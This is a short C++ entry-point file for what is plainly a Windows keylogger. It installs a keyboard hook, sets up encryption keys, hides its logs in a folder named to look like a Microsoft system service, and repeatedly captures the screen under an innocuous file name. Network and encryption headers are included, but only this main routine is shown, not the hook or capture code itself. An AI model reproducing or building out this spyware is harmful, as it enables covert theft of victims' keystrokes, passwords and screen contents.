#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "encrypt.h"
#include "net.h"
#include "debug.h"

int main() {
#ifdef DEBUG_BUILD
#endif

#ifndef DEBUG_BUILD
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
  Stream::MakeFile();
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);

  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
						"winpst",
						false,
						1000,
						5);

  KeyHook::HandleMessage(true);
#endif // DEBUG_BUILD
  return 0;
}


